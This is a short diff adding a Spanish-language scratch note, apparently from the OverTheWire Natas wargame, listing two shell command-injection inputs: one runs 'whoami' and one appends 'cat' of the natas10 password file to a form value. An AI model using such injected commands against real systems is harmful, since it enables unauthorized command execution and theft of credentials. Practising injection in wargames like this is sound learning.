@@ -1,0 +1,6 @@
+# Probar las diferentes formas
+
+; whoami 2>&1
+
+test; cat /etc/natas_webpass/natas10
+
